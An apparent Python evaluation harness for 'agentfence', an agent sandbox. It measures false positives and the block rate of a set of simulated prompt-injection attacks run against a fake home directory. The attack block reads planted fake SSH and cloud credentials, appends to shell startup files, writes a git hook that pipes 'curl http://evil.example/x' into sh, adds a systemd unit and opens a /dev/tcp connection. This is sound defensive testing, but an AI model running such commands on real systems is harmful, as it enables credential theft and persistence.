#!/usr/bin/env python3
"""agentfence evaluation harness (single entry point).

    python3 eval/run_eval.py                  # full run (slow)
    python3 eval/run_eval.py --projects agentfence --modes strict --quick
    python3 eval/run_eval.py --keep           # keep the scratch workspace

Measures, on real projects copied into a scratch workspace with a FAKE $HOME:
  1. learning curve / false positives (learn from k workflows, enforce held-out ones)
  2. injection block rate (benign workflow + 12 attacks appended)
  3. reachable-surface reduction (files readable/writable: no sandbox vs profile)

Results: eval/results/<timestamp>.json (+ latest.json, latest.md).
See the "Evaluation" section of the top-level README for the method and caveats.
Python 3.9+, stdlib only.
"""
import argparse
import json
import os
import random
import re
import shutil
import socket
import stat as S
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
OSS = ROOT.parent  # sibling projects live next to agentfence
REAL_HOME = Path.home()
MARK = "AGENTFENCE-EVAL-FAKE-SECRET"
RUN_TIMEOUT = 900

# --------------------------------------------------------------------------
# Workflows. Each is a bash snippet run under `bash -c` in the project root
# with `set -e`. They print WF_OK at the end; success = exit 0 and WF_OK seen.
# --------------------------------------------------------------------------

PY_TEST_FILES = {
    "patchproof": "tests/test_diff.py tests/test_classify.py tests/test_verdict.py tests/test_testfiles.py tests/test_cli.py",
    "mcp-persist": "tests/test_compression.py tests/test_config.py tests/test_retention.py tests/test_health.py",
}

PATCHPROOF_CLI = r"""
d=$TMPDIR/pp-demo; rm -rf "$d"; mkdir -p "$d/base"
printf 'def add(a, b):\n    return a - b\n' > "$d/base/calc.py"
printf 'from calc import add\n\ndef test_add():\n    assert add(2, 3) == 5\n' > "$d/base/test_calc.py"
printf -- '--- a/calc.py\n+++ b/calc.py\n@@ -1,2 +1,2 @@\n def add(a, b):\n-    return a - b\n+    return a + b\n' > "$d/fix.patch"
(cd "$d/base" && git init -q . && git add -A && git commit -qm base)
.venv/bin/patchproof --version
.venv/bin/patchproof check --repo "$d/base" --patch "$d/fix.patch" --test-cmd "python -m pytest -x -q" >/dev/null || true
test -d "$d/base"
"""


def py_workflows(proj):
    t = PY_TEST_FILES[proj]
    wfs = {
        "test": f".venv/bin/python -m pytest -q -p no:cacheprovider {t}",
        "lint": "ruff check --exit-zero src tests",
        "venv": "rm -rf .venv && uv sync --offline && .venv/bin/python -c 'import sys; print(sys.version_info[:2])'",
        "edit": (
            "f=$(grep -rl 'def ' src --include=*.py | sort | head -1); echo \"edit $f\"; "
            "grep -n 'def ' \"$f\" | head -5; sed -i '1i # reviewed by agent' \"$f\"; "
            f".venv/bin/python -m pytest -q -p no:cacheprovider {t}"
        ),
        "git": (
            "git status --short | head -5; echo '' >> README.md; echo 'Agent note.' >> README.md; "
            "git diff --stat; git add README.md; "
            "git -c commit.gpgsign=false commit -qm 'docs: agent note'; git log --oneline | head -3"
        ),
        "build": "uv build --offline --wheel --out-dir dist && ls dist",
    }
    if proj == "patchproof":
        wfs["cli"] = PATCHPROOF_CLI
    else:
        wfs["cli"] = ".venv/bin/mcp-persist --version && .venv/bin/mcp-persist --help >/dev/null"
    return wfs


AGENTFENCE_WFS = {
    "test": "cargo test --offline -j 2 --lib",
    "lint": "cargo clippy --offline -j 2 --all-targets -- -D warnings",
    "build": "cargo build --offline -j 2",
    "fmt": "cargo fmt --check && cargo metadata --offline --format-version 1 >/dev/null",
    "edit": (
        "grep -n 'pub fn' src/rules.rs | head -5; sed -i '1i // reviewed by agent' src/rules.rs; "
        "cargo test --offline -j 2 --lib"
    ),
    "git": (
        "git status --short | head -5; echo '' >> README.md; git diff --stat; git add src Cargo.toml; "
        "git -c commit.gpgsign=false commit -qm 'chore: agent commit' --allow-empty; git log --oneline | head -3"
    ),
    "cli": "cargo run --offline -q -j 2 -- doctor",
}

PROJECTS = {
    "patchproof": {"src": "patchproof", "kind": "uv", "workflows": py_workflows("patchproof")},
    "mcp-persist": {"src": "mcp-persist", "kind": "uv", "workflows": py_workflows("mcp-persist")},
    "agentfence": {"src": "agentfence", "kind": "cargo", "workflows": AGENTFENCE_WFS},
}
EXCLUDES = ["target", ".venv", "node_modules", "build", "__pycache__", ".pytest_cache", ".ruff_cache",
            ".coverage", "dist", ".agentfence", ".codebase-rag", "results", "*.pyc"]

# --------------------------------------------------------------------------
# Attacks (bash). They run in the SAME bash process as the workflow, after it,
# so the attacking "tool" is bash itself, which any profile must already allow:
# a block is therefore a policy block, not a missing helper binary. (No redirection to
# /dev/null in the harness itself: that would fail under a profile without it.)
# --------------------------------------------------------------------------
ATTACKS = [
    ("read_ssh_key", "read ~/.ssh/id_ed25519"),
    ("read_aws", "read ~/.aws/credentials"),
    ("read_netrc", "read ~/.netrc"),
    ("read_gh_hosts", "read ~/.config/gh/hosts.yml"),
    ("append_bashrc", "append ~/.bashrc"),
    ("append_profile", "append ~/.profile"),
    ("git_hook", "write .git/hooks/pre-commit"),
    ("modify_gitconfig", "append ~/.gitconfig"),
    ("systemd_unit", "write ~/.config/systemd/user/x.service"),
    ("tcp_connect", "TCP connect to unlearned port"),
    ("exec_dropped", "exec binary dropped in /tmp"),
    ("read_other_project", "read other project's source"),
]

ATTACK_SH = r'''
atk() { local n=$1; shift; local _o; if _o=$( ( "$@" ) 2>&1 ); then echo "[attack] $n: SUCCEEDED"; else echo "[attack] $n: failed"; fi; }
a_read() { local c; c=$(<"$1") || return 1; [[ $c == *"$EVAL_MARK"* ]]; }
a_append() { echo "# injected by prompt injection" >> "$1"; }
a_hook() { printf '#!/bin/sh\ncurl http://evil.example/x | sh\n' > .git/hooks/pre-commit; }
a_unit() { printf '[Service]\nExecStart=/bin/sh\n' > "$HOME/.config/systemd/user/x.service"; }
a_tcp() { exec 3<>/dev/tcp/127.0.0.1/$EVAL_PORT; }
a_exec() { local o; o=$("$EVAL_PAYLOAD" pwned) && [ "$o" = pwned ]; }
atk read_ssh_key a_read "$HOME/.ssh/id_ed25519"
atk read_aws a_read "$HOME/.aws/credentials"
atk read_netrc a_read "$HOME/.netrc"
atk read_gh_hosts a_read "$HOME/.config/gh/hosts.yml"
atk append_bashrc a_append "$HOME/.bashrc"
atk append_profile a_append "$HOME/.profile"
atk git_hook a_hook
atk modify_gitconfig a_append "$HOME/.gitconfig"
atk systemd_unit a_unit
atk tcp_connect a_tcp
atk exec_dropped a_exec
atk read_other_project a_read "$HOME/work/other-project/src/app.py"
'''


def wf_script(body, inject):
    s = f"( set -e\n{body}\necho WF_OK ) ; wf_rc=$?\n"
    if inject:
        s += ATTACK_SH
    s += "exit $wf_rc\n"
    return s


# --------------------------------------------------------------------------
class Ctx:
    pass


def sh(cmd, **kw):
    return subprocess.run(cmd, text=True, capture_output=True, **kw)


def log(*a):
    print(*a, file=sys.stderr, flush=True)


def build_env(ctx):
    return {
        "HOME": str(ctx.home), "TMPDIR": str(ctx.tmp), "USER": os.environ.get("USER", "u"),
        "LANG": "C.UTF-8", "TERM": "dumb",
        # real toolchains/caches (documented): everything else, incl. HOME, is fake
        "CARGO_HOME": str(REAL_HOME / ".cargo"), "RUSTUP_HOME": str(REAL_HOME / ".rustup"),
        "UV_CACHE_DIR": str(REAL_HOME / ".cache/uv"),
        "UV_PYTHON_INSTALL_DIR": str(REAL_HOME / ".local/share/uv/python"),
        "PATH": f"{REAL_HOME}/.cargo/bin:{REAL_HOME}/.local/bin:/usr/local/bin:/usr/bin",
        "CARGO_TARGET_DIR": str(ctx.cargo_target), "CARGO_NET_OFFLINE": "true", "UV_OFFLINE": "1",
        "UV_NO_PROGRESS": "1", "NO_COLOR": "1", "PYTHONDONTWRITEBYTECODE": "1",
        "GIT_CONFIG_NOSYSTEM": "1",
        "EVAL_MARK": MARK, "EVAL_PORT": str(ctx.port), "EVAL_PAYLOAD": str(ctx.payload),
    }


def rm(p):
    if p.is_dir() and not p.is_symlink():
        shutil.rmtree(p, ignore_errors=True)
    else:
        p.unlink()


def plant_home(ctx):
    """Reset the fake HOME (everything except work/) and plant fake secrets + attack targets."""
    h = ctx.home
    for e in h.iterdir():
        if e.name != "work":
            rm(e)
    for rel in [".ssh/id_ed25519", ".aws/credentials", ".netrc", ".config/gh/hosts.yml"]:
        p = h / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(MARK + "\n")
        p.chmod(0o600)
    (h / ".bashrc").write_text("# fake bashrc\n")
    (h / ".profile").write_text("# fake profile\n")
    (h / ".gitconfig").write_text("[user]\n\tname = Eval User\n\temail = eval@example.com\n[init]\n\tdefaultBranch = main\n[gc]\n\tauto = 0\n[maintenance]\n\tauto = false\n")
    (h / ".config/systemd/user").mkdir(parents=True, exist_ok=True)
    other = h / "work/other-project/src"
    other.mkdir(parents=True, exist_ok=True)
    (other / "app.py").write_text(f"# another project's proprietary source\nTOKEN = '{MARK}'\n")
    for e in ctx.tmp.iterdir():
        rm(e)
    shutil.copy("/usr/bin/echo", ctx.payload)
    ctx.payload.chmod(0o755)


def restore(ctx, proj):
    live, gold = ctx.live(proj), ctx.golden(proj)
    for _ in range(3):  # code 24 = a file vanished (a detached child of the previous run still exiting)
        r = sh(["rsync", "-a", "--delete", "--exclude", "/.agentfence", f"{gold}/", f"{live}/"])
        if r.returncode == 0:
            break
        time.sleep(1)
    if r.returncode not in (0, 24):
        raise RuntimeError(f"rsync restore failed: {r.stderr}")
    (live / ".git/hooks").mkdir(parents=True, exist_ok=True)


def run_proc(ctx, proj, argv, script):
    live = ctx.live(proj)
    t0 = time.time()
    try:
        r = subprocess.run(argv + ["bash", "-c", script], cwd=live, env=build_env(ctx), text=True,
                           capture_output=True, timeout=RUN_TIMEOUT)
        rc, out, err = r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        rc, out, err = 124, "", "TIMEOUT"
    return rc, out, err, time.time() - t0


def parse_attacks(out):
    return {m.group(1): m.group(2) == "SUCCEEDED" for m in re.finditer(r"\[attack\] (\w+): (SUCCEEDED|failed)", out)}


def denial_summary(ctx, proj, profile):
    live = ctx.live(proj)
    d = live / ".agentfence/denials"
    logs = sorted(d.glob("*.jsonl")) if d.exists() else []
    if not logs:
        return 0, []
    r = sh([str(ctx.bin), "--project", str(live), "report", "--denials", str(logs[-1]), "--profile",
            str(profile), "--color", "never"], env=build_env(ctx))
    m = re.search(r"Summary: (\d+) blocked", r.stdout)
    n = int(m.group(1)) if m else 0
    lines = [re.sub(r"\s+", " ", l.strip()) for l in r.stdout.splitlines() if l.strip().startswith("BLOCKED")]
    shutil.rmtree(d, ignore_errors=True)
    return n, lines


def execute(ctx, proj, wf, mode, profile=None, inject=False, launcher=False):
    """mode: control (no sandbox) | learn | enforce. Returns a result dict."""
    restore(ctx, proj)
    plant_home(ctx)
    live = ctx.live(proj)
    script = wf_script(ctx.workflows[proj][wf], inject)
    if mode == "control":
        argv = []
    elif mode == "learn":
        argv = [str(ctx.bin), "--project", str(live), "learn", "--name", wf, "--"]
    elif launcher:
        argv = [str(ctx.exec_bin), "--rules", str(Path(profile).with_suffix(".rules")), "--"]
    else:
        argv = [str(ctx.bin), "--project", str(live), "run", "--profile", str(profile), "--"]
    rc, out, err, secs = run_proc(ctx, proj, argv, script)
    res = {"project": proj, "workflow": wf, "mode": mode, "rc": rc, "ok": rc == 0 and "WF_OK" in out,
           "secs": round(secs, 1), "inject": inject, "launcher": launcher}
    if inject:
        res["attacks"] = parse_attacks(out)
    if mode == "enforce" and not launcher:
        res["denials"], res["denial_lines"] = denial_summary(ctx, proj, profile)
    if not res["ok"]:
        res["stderr_tail"] = "\n".join(err.strip().splitlines()[-8:])
        res["stdout_tail"] = "\n".join(out.strip().splitlines()[-4:])
    return res


# --------------------------------------------------------------------------
def prepare(ctx, only):
    for proj, spec in PROJECTS.items():
        if only and proj not in only:
            continue
        live = ctx.live(proj)
        live.mkdir(parents=True)
        cmd = ["rsync", "-a"] + [f"--exclude={x}" for x in EXCLUDES] + [f"{OSS / spec['src']}/", f"{live}/"]
        r = sh(cmd)
        if r.returncode:
            raise RuntimeError(r.stderr)
        env = build_env(ctx)
        env.update(GIT_AUTHOR_NAME="e", GIT_AUTHOR_EMAIL="e@e", GIT_COMMITTER_NAME="e", GIT_COMMITTER_EMAIL="e@e")
        plant_home(ctx)
        if sh(["git", "rev-parse", "HEAD"], cwd=live, env=env).returncode != 0:
            sh(["git", "init", "-q", "-b", "main", "."], cwd=live, env=env)
            sh(["git", "add", "-A"], cwd=live, env=env)
            sh(["git", "commit", "-qm", "eval baseline"], cwd=live, env=env)
        (live / ".git/hooks").mkdir(parents=True, exist_ok=True)
        if spec["kind"] == "uv":
            r = sh(["uv", "sync", "--offline"], cwd=live, env=env)
            # a developer's checkout already has the tool caches/outputs from earlier work
            sh(["ruff", "check", "--exit-zero", "src", "tests"], cwd=live, env=env)
            sh(["uv", "build", "--offline", "--wheel", "--out-dir", "dist"], cwd=live, env=env)
        else:  # warm the shared cargo target dir so workflows measure steady state
            r = sh(["cargo", "build", "--offline", "-j", "2"], cwd=live, env=env)
            sh(["cargo", "clippy", "--offline", "-j", "2", "--all-targets", "--", "-D", "warnings"], cwd=live, env=env)
            sh(["cargo", "test", "--offline", "-j", "2", "--lib", "--no-run"], cwd=live, env=env)
        if r.returncode:
            raise RuntimeError(f"prepare {proj}: {r.stderr[-500:]}")
        shutil.copytree(live, ctx.golden(proj), symlinks=True)


def learn_all(ctx, proj, wfs):
    """Learn each workflow once; keep jsonl + meta in <work>/traces/<proj>/<NN>-<wf>.*"""
    tdir = ctx.work / "traces" / proj
    tdir.mkdir(parents=True, exist_ok=True)
    live = ctx.live(proj)
    done = []
    for i, wf in enumerate(wfs):
        shutil.rmtree(live / ".agentfence", ignore_errors=True)
        res = execute(ctx, proj, wf, "learn")
        tr = live / ".agentfence/traces"
        stems = sorted(tr.glob("*.jsonl")) if tr.exists() else []
        if not res["ok"] or not stems:
            log(f"  learn {proj}/{wf}: FAILED rc={res['rc']} {res.get('stderr_tail', '')[:300]}")
            continue
        stem = stems[-1].name[:-len(".jsonl")]
        for ext in ("jsonl", "meta.json"):
            shutil.copy(tr / f"{stem}.{ext}", tdir / f"{i:02d}-{wf}.{ext}")
        n_ev = sum(1 for _ in open(tdir / f"{i:02d}-{wf}.jsonl"))
        log(f"  learned {proj}/{wf}: {n_ev} events, {res['secs']}s")
        done.append(wf)
    shutil.rmtree(live / ".agentfence", ignore_errors=True)
    return done


def make_profile(ctx, proj, train, gitw):
    key = ("gitw-" if gitw else "strict-") + "+".join(sorted(train))
    pdir = ctx.work / "profiles" / proj / re.sub(r"[^A-Za-z0-9+_.-]", "_", key)
    prof = pdir / "profile.toml"
    if prof.exists():
        return prof
    pdir.mkdir(parents=True)
    live = ctx.live(proj)
    restore(ctx, proj)  # synth walks the project tree: give it the pristine state, not the last run's leftovers
    shutil.rmtree(live / ".agentfence", ignore_errors=True)
    tr = live / ".agentfence/traces"
    tr.mkdir(parents=True)
    for f in sorted((ctx.work / "traces" / proj).iterdir()):
        if f.name.split(".")[0].split("-", 1)[1] in train:
            shutil.copy(f, tr / f.name)
    cmd = [str(ctx.bin), "--project", str(live), "synth", "--out", str(prof)]
    if gitw:
        cmd.append("--allow-git-writes")
    r = sh(cmd, env=build_env(ctx))
    (pdir / "synth.stderr").write_text(r.stderr)
    shutil.rmtree(live / ".agentfence", ignore_errors=True)
    if r.returncode:
        raise RuntimeError(f"synth failed {proj} {key}: {r.stderr}")
    return prof


# --------------------------------------------------------------------------
# Surface counting
def walk_count(roots, cap, prune=()):
    """Count entries under roots (lstat, no symlink following). Files are counted as readable/writable
    by os.access (plain unix permissions of the unsandboxed user). `cap` bounds the number of files."""
    seen = set()
    c = {"read_files": 0, "write_files": 0, "dirs": 0, "write_dirs": 0, "capped": False}
    total = 0
    for root in roots:
        stack = [root]
        while stack:
            p = stack.pop()
            if p in seen or any(p == q or p.startswith(q + "/") for q in prune):
                continue
            seen.add(p)
            try:
                st = os.lstat(p)
            except OSError:
                continue
            if S.S_ISDIR(st.st_mode):
                c["dirs"] += 1
                if os.access(p, os.W_OK | os.X_OK):
                    c["write_dirs"] += 1
                try:
                    with os.scandir(p) as it:
                        stack.extend(e.path for e in it)
                except OSError:
                    pass
            else:
                total += 1
                if os.access(p, os.R_OK):
                    c["read_files"] += 1
                if os.access(p, os.W_OK):
                    c["write_files"] += 1
                if total >= cap:
                    c["capped"] = True
                    return c
    return c


def top_most(paths):
    out = []
    for p in sorted(set(paths)):
        if not any(p == q or p.startswith(q.rstrip("/") + "/") for q in out):
            out.append(p)
    return out


PSEUDO = ("/proc", "/sys")


def is_pseudo(p):
    return any(p == q or p.startswith(q + "/") for q in PSEUDO)


def profile_surface(rules_path, cap):
    """Files readable/writable through the rules of a profile (existing files only, unix perms applied).
    /proc and /sys are counted separately: they hold per-process entries, not files."""
    reads, writes, n = [], [], 0
    for line in Path(rules_path).read_text().splitlines():
        if not line.startswith("fs\t"):
            continue
        n += 1
        _, path, rights = line.split("\t")
        r = set(rights.split(","))
        if "read_file" in r:
            reads.append(path)
        if r & {"write_file", "make_reg", "remove_file", "truncate"}:
            writes.append(path)
    out = {"n_rules": n, "capped": False}
    for kind, paths in (("read", reads), ("write", writes)):
        tm = top_most(paths)
        real = [p for p in tm if not is_pseudo(p)]
        pseudo = [p for p in tm if is_pseudo(p)]
        wr, ps = walk_count(real, cap), walk_count(pseudo, cap)
        out[f"{kind}_files"] = wr[f"{kind}_files"]
        out[f"{kind}_pseudo"] = ps[f"{kind}_files"]
        out["capped"] = out["capped"] or wr["capped"] or ps["capped"]
        if kind == "write":
            out["write_dirs"] = wr["write_dirs"]
        sizes = sorted(((walk_count([p], cap)[f"{kind}_files"], p) for p in real), reverse=True)[:5]
        out[f"top_{kind}_grants"] = [[c, p] for c, p in sizes]
    return out


def baseline_surface(ctx, cap):
    """Everything the unsandboxed user could reach in the system dirs, the fake HOME/TMPDIR/cargo target and
    the real toolchain caches. Deliberately excludes the real $HOME otherwise (see README caveats)."""
    import glob
    roots = ["/usr", "/etc", "/opt", "/var", "/srv", "/mnt", "/media", "/run", "/tmp", str(ctx.home), str(ctx.tmp),
             str(ctx.cargo_target), str(REAL_HOME / ".cargo"), str(REAL_HOME / ".rustup"),
             str(REAL_HOME / ".cache"), str(REAL_HOME / ".local/share/uv")]
    roots = [r for r in roots if os.path.exists(r)]
    prune = ["/var/home", "/var/roothome"] + glob.glob("/tmp/agentfence-eval.*")
    c = walk_count([r for r in roots if not r.startswith(str(ctx.work))], cap, prune=prune)
    inner = walk_count([str(ctx.home), str(ctx.tmp), str(ctx.cargo_target)], cap)
    pseudo = walk_count([p for p in PSEUDO if os.path.exists(p)], cap)
    return {"read_files": c["read_files"] + inner["read_files"], "write_files": c["write_files"] + inner["write_files"],
            "write_dirs": c["write_dirs"] + inner["write_dirs"], "read_pseudo": pseudo["read_files"],
            "write_pseudo": pseudo["write_files"], "capped": c["capped"] or inner["capped"] or pseudo["capped"],
            "roots": roots + list(PSEUDO)}


# --------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--projects", nargs="*", default=None, help=f"subset of {list(PROJECTS)}")
    ap.add_argument("--workflows", nargs="*", default=None, help="restrict workflows (names)")
    ap.add_argument("--modes", default="strict,gitw", help="synth modes: strict (default synth), gitw (--allow-git-writes)")
    ap.add_argument("--subsets", type=int, default=3, help="random training subsets per k (k < n-1)")
    ap.add_argument("--ks", default="1,2,4,loo")
    ap.add_argument("--quick", action="store_true", help="1 subset per k, no C-launcher run")
    ap.add_argument("--keep", action="store_true", help="keep the scratch workspace")
    ap.add_argument("--surface-cap", type=int, default=3_000_000)
    ap.add_argument("--bin", default=os.environ.get("AGENTFENCE_BIN"))
    ap.add_argument("--no-build", action="store_true")
    ap.add_argument("--label", default="", help="suffix for the result file names")
    args = ap.parse_args()
    if args.quick:
        args.subsets = 1

    ctx = Ctx()
    if args.bin:
        ctx.bin = Path(args.bin)
    else:
        tgt = Path(os.environ.get("CARGO_TARGET_DIR", ROOT / "target"))
        if not args.no_build:
            r = subprocess.run(["cargo", "build", "-j", "2", "--quiet"], cwd=ROOT)
            if r.returncode:
                sys.exit("cargo build failed")
        ctx.bin = tgt / "debug/agentfence"
    d = sh([str(ctx.bin), "doctor"]).stdout
    if "landlock: ABI" not in d or not shutil.which("strace"):
        print("SKIP: Landlock or strace unavailable")
        sys.exit(77)

    work = Path(tempfile.mkdtemp(prefix="agentfence-eval."))
    ctx.work = work
    ctx.home, ctx.tmp = work / "home", work / "tmp"
    ctx.cargo_target = work / "cargo-target"
    ctx.payload = ctx.tmp / "payload.bin"
    for p in (ctx.home / "work", ctx.tmp, ctx.cargo_target, work / "golden"):
        p.mkdir(parents=True)
    ctx.live = lambda proj: ctx.home / "work" / proj
    ctx.golden = lambda proj: work / "golden" / proj
    ctx.exec_bin = None
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(64)
    ctx.port = listener.getsockname()[1]
    log(f"workspace: {work} (fake HOME={ctx.home}); listener port {ctx.port}")

    results = {"meta": {"started": time.strftime("%Y-%m-%dT%H:%M:%S"), "kernel": os.uname().release,
                        "doctor": d.strip(), "args": {**vars(args), "bin": str(ctx.bin)}},
               "workflows": {}, "learning": [], "injection": [], "controls": [], "surface": {}}
    try:
        if not args.quick and shutil.which("meson") and shutil.which("ninja"):
            lb = work / "launcher-build"
            if sh(["meson", "setup", str(lb), str(ROOT / "launcher")]).returncode == 0 \
                    and sh(["ninja", "-C", str(lb), "-j", "2"]).returncode == 0:
                ctx.exec_bin = lb / "agentfence-exec"
        only = args.projects
        ctx.workflows = {}
        for proj, spec in PROJECTS.items():
            wfs = dict(spec["workflows"])
            if args.workflows:
                wfs = {k: v for k, v in wfs.items() if k in args.workflows}
            ctx.workflows[proj] = wfs
        log("preparing projects (copy, venv/cargo warm-up)")
        prepare(ctx, only)
        projs = [p for p in PROJECTS if not only or p in only]
        modes = args.modes.split(",")
        rng = random.Random(20261002)

        for proj in projs:
            log(f"== {proj}: controls (no sandbox, injected) and learning")
            ok_wfs = []
            for wf in list(ctx.workflows[proj]):
                r = execute(ctx, proj, wf, "control", inject=True)
                results["controls"].append(r)
                log(f"  control {wf}: ok={r['ok']} {r['secs']}s attacks_succeeded={sum(r['attacks'].values())}/{len(r['attacks'])}")
                if r["ok"]:
                    ok_wfs.append(wf)
                else:
                    log(f"    DROPPED (fails with no sandbox): {r.get('stderr_tail', '')[:300]}")
            ctx.workflows[proj] = {k: v for k, v in ctx.workflows[proj].items() if k in ok_wfs}
            learned = learn_all(ctx, proj, ok_wfs)
            results["workflows"][proj] = learned
            n = len(learned)
            if n < 3:
                log(f"  too few workflows for {proj}; skipping")
                continue

            for mode in modes:
                gitw = mode == "gitw"
                # ---- learning curve
                for ks in args.ks.split(","):
                    k = n - 1 if ks == "loo" else int(ks)
                    if k >= n:
                        continue
                    if k == n - 1:
                        subsets = [[w for w in learned if w != h] for h in learned]
                    else:
                        seen, subsets = set(), []
                        for _ in range(args.subsets * 5):
                            s = tuple(sorted(rng.sample(learned, k)))
                            if s not in seen:
                                seen.add(s)
                                subsets.append(list(s))
                            if len(subsets) >= args.subsets:
                                break
                    for tr in subsets:
                        prof = make_profile(ctx, proj, tr, gitw)
                        for h in learned:
                            if h in tr:
                                continue
                            r = execute(ctx, proj, h, "enforce", profile=prof)
                            r.update(kind="learning", k=ks, train=sorted(tr), held_out=h, synth=mode)
                            results["learning"].append(r)
                            log(f"  [{mode}] k={ks} train={'+'.join(tr)} -> {h}: ok={r['ok']} denials={r['denials']} {r['secs']}s")
                # ---- injection: leave-one-out profile and all-workflows profile
                for h in learned:
                    for which, tr in (("loo", [w for w in learned if w != h]), ("all", list(learned))):
                        prof = make_profile(ctx, proj, tr, gitw)
                        for launcher in ([False, True] if (which == "all" and ctx.exec_bin) else [False]):
                            r = execute(ctx, proj, h, "enforce", profile=prof, inject=True, launcher=launcher)
                            r.update(kind="injection", profile=which, synth=mode, held_out=h)
                            results["injection"].append(r)
                            log(f"  [{mode}] inject {which}{'/launcher' if launcher else ''} {h}: ok={r['ok']} blocked="
                                f"{sum(1 for v in r['attacks'].values() if not v)}/{len(r['attacks'])}")
                # ---- surface (profile from all workflows)
                prof = make_profile(ctx, proj, list(learned), gitw)
                s = profile_surface(prof.with_suffix(".rules"), args.surface_cap)
                results["surface"].setdefault(mode, {})[proj] = s
                log(f"  surface [{mode}] {proj}: {s}")
        log("baseline surface walk")
        results["surface"]["baseline"] = baseline_surface(ctx, args.surface_cap)
        log(f"  baseline: {results['surface']['baseline']}")
    finally:
        listener.close()
        results["meta"]["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S")
        outdir = HERE / "results"
        outdir.mkdir(exist_ok=True)
        stamp = time.strftime("%Y%m%d-%H%M%S") + (f"-{args.label}" if args.label else "")
        js = json.dumps(results, indent=1)
        (outdir / f"{stamp}.json").write_text(js)
        (outdir / "latest.json").write_text(js)
        md = render(results)
        (outdir / f"{stamp}.md").write_text(md)
        (outdir / "latest.md").write_text(md)
        print(md)
        if args.keep:
            log(f"kept workspace {work}")
        else:
            shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------
def pct(a, b):
    return "n/a" if b == 0 else f"{100.0 * a / b:.0f}% ({a}/{b})"


def table(header, rows):
    w = [max(len(str(x)) for x in col) for col in zip(header, *rows)]
    line = lambda r: "| " + " | ".join(str(x).ljust(w[i]) for i, x in enumerate(r)) + " |"
    return "\n".join([line(header), "|" + "|".join("-" * (x + 2) for x in w) + "|"] + [line(r) for r in rows])


def exec_only(r):
    """A failed run whose denials are all `exec X` plus the matching `read X` (an executable never seen in training)."""
    if r["ok"] or not r.get("denial_lines"):
        return False
    lines = [re.sub(r" x\d+$", "", l).split(" ", 2) for l in r["denial_lines"]]
    execs = {l[2] for l in lines if l[1] == "exec"}
    return bool(execs) and all(l[1] == "exec" or (l[1] == "read" and l[2] in execs) for l in lines)


def render(res):
    out = ["## Workflows\n"]
    for p, w in res["workflows"].items():
        out.append(f"- {p}: {', '.join(w)}")
    modes = sorted({r["synth"] for r in res["learning"]} | {r["synth"] for r in res["injection"]})
    ctrl = {(c["project"], c["workflow"]): c["attacks"] for c in res["controls"]}
    for mode in modes:
        L = [r for r in res["learning"] if r["synth"] == mode]
        if L:
            out.append(f"\n## Learning curve, synth mode `{mode}`\n")
            ks = []
            for r in L:
                if r["k"] not in ks:
                    ks.append(r["k"])
            rows = []
            for scope in sorted({r["project"] for r in L}) + ["ALL"]:
                for k in ks:
                    rr = [r for r in L if r["k"] == k and (scope == "ALL" or r["project"] == scope)]
                    if not rr:
                        continue
                    profs = len({(r["project"], tuple(r["train"])) for r in rr})
                    rows.append([scope, "all-but-one" if k == "loo" else k, profs, len(rr),
                                 pct(sum(r["ok"] for r in rr), len(rr)),
                                 f"{sum(r['denials'] for r in rr) / len(rr):.1f}",
                                 pct(sum(1 for r in rr if r["denials"] == 0), len(rr)),
                                 sum(1 for r in rr if exec_only(r))])
            out.append(table(["project", "k", "profiles", "held-out runs", "completed", "mean denials/run",
                              "zero-denial runs", "failed only on an unseen executable"], rows))
            loo = [r for r in L if r["k"] == "loo"]
            if loo:
                out.append("\nAll-but-one, per held-out workflow:\n")
                out.append(table(["project", "workflow", "completed", "denials", "first denials"],
                                 [[r["project"], r["held_out"], "yes" if r["ok"] else "NO", r["denials"],
                                   "; ".join(r["denial_lines"][:3])[:120]] for r in loo]))
        I = [r for r in res["injection"] if r["synth"] == mode]
        for variant in ("loo", "all"):
            for launcher in (False, True):
                rr = [r for r in I if r["profile"] == variant and r["launcher"] == launcher]
                if not rr:
                    continue
                label = ("profile learned WITHOUT the attacked workflow (all-but-one)" if variant == "loo"
                         else "profile learned from ALL workflows") + (", enforced by the C launcher" if launcher else "")
                rows, tot_a, tot_b = [], 0, 0
                for name, desc in ATTACKS:
                    att = blk = 0
                    for r in rr:
                        if not ctrl.get((r["project"], r["workflow"]), {}).get(name):
                            continue  # attack was not feasible even with no sandbox: not counted
                        att += 1
                        blk += r["attacks"].get(name) is False
                    tot_a += att
                    tot_b += blk
                    rows.append([name, desc, pct(blk, att)])
                rows.append(["TOTAL", "", pct(tot_b, tot_a)])
                real = sum(1 for r in rr if r["ok"])
                out.append(f"\n## Injection, synth `{mode}`, {label}\n")
                out.append(f"{len(rr)} injected runs; the real workflow still completed in {real}/{len(rr)}.\n")
                out.append(table(["attack", "description", "blocked/attempted"], rows))
    b = res["surface"].get("baseline")
    if b:
        out.append("\n## Reachable surface\n")
        out.append(f"Unsandboxed baseline (walk of {', '.join(b['roots'])}): readable files {b['read_files']} "
                   f"(+{b['read_pseudo']} procfs/sysfs entries), writable files {b['write_files']} "
                   f"(+{b['write_pseudo']} procfs/sysfs), writable dirs {b['write_dirs']}{' (CAPPED)' if b['capped'] else ''}\n")
        rows = []
        for mode, dd in res["surface"].items():
            if mode == "baseline":
                continue
            for p, s in dd.items():
                rows.append([mode, p, s["n_rules"], s["read_files"], f"{b['read_files'] / max(1, s['read_files']):.1f}x",
                             s["read_pseudo"], s["write_files"], f"{b['write_files'] / max(1, s['write_files']):.0f}x",
                             s["write_pseudo"], s["write_dirs"]])
        out.append(table(["synth", "project", "rules", "readable files", "read reduction", "procfs/sysfs readable",
                          "writable files", "write reduction", "procfs/sysfs writable", "writable dirs"], rows))
        out.append("\nLargest read grants (files):\n")
        for mode, dd in res["surface"].items():
            if mode == "strict":
                for p, s in dd.items():
                    out.append(f"- {p}: " + ", ".join(f"{c} {path}" for c, path in s["top_read_grants"][:4]))
    return "\n".join(out) + "\n"


if __name__ == "__main__":
    main()
